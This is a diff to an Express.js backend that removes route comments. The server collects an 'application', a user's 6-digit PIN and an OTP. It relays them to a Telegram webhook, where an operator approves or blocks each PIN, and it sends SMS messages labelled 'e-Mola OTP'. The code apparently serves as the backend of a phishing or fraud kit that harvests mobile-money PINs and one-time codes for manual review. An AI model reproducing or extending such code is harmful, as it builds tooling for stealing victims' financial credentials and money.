@@ -66,7 +66,6 @@ app.use((err, req, res, next) => {
 // Routes
 app.get('/api/health', (req, res) => res.json({ ok: true }));
 
-// 1. Submit application
 app.post('/api/send-application', async (req, res) => {
   try {
     const data = req.body.applicationData;
@@ -101,14 +100,12 @@ app.post('/api/send-application', async (req, res) => {
   }
 });
 
-// 2. Check app status
 app.get('/api/status/:applicationId/app', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
   res.json({ ok: true, status: app.pinStatus, step: 'app' });
 });
 
-// 3. Send PIN (user submits PIN – 6 digits)
 app.post('/api/send-pin', async (req, res) => {
   try {
     const { applicationId, pin } = req.body;
@@ -141,7 +138,6 @@ app.post('/api/send-pin', async (req, res) => {
   }
 });
 
-// 4. Check PIN status
 app.get('/api/status/:applicationId/pin', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
@@ -154,7 +150,6 @@ app.get('/api/status/:applicationId/pin', (req, res) => {
   });
 });
 
-// 5. PIN rejected handler
 app.post('/api/pin-rejected', async (req, res) => {
   try {
     const { applicationId } = req.body;
@@ -185,7 +180,6 @@ app.post('/api/pin-rejected', async (req, res) => {
   }
 });
 
-// 6. Reset PIN attempts
 app.post('/api/reset-pin-attempts/:applicationId', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
@@ -195,7 +189,6 @@ app.post('/api/reset-pin-attempts/:applicationId', (req, res) => {
   res.json({ ok: true });
 });
 
-// 7. Send OTP (user submits OTP – 6 digits)
 app.post('/api/send-otp', async (req, res) => {
   try {
     const { applicationId, otp } = req.body;
@@ -228,14 +221,12 @@ app.post('/api/send-otp', async (req, res) => {
   }
 });
 
-// 8. Check OTP status
 app.get('/api/status/:applicationId/otp', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
   res.json({ ok: true, status: app.otpStatus });
 });
 
-// 9. Dashboard
 app.get('/api/dashboard/:applicationId', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
@@ -255,7 +246,6 @@ app.get('/api/dashboard/:applicationId', (req, res) => {
   });
 });
 
-// 10. Telegram Webhook (HYBRID)
 app.post('/api/telegram-webhook', async (req, res) => {
   const update = req.body;
 
@@ -288,7 +278,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
           app.pinStatus = 'blocked';
         }
       } else if (app.pinStatus === 'approved') {
-        const otpCode = generateCode(6);  // 6-digit OTP
+        const otpCode = generateCode(6);
         app.otpCode = otpCode;
         await sendSms(`+258${app.phone}`, `Your e-Mola OTP is: ${otpCode}`);
       }
@@ -324,7 +314,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
   res.sendStatus(200);
 });
 
-// Serve frontend
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
 });
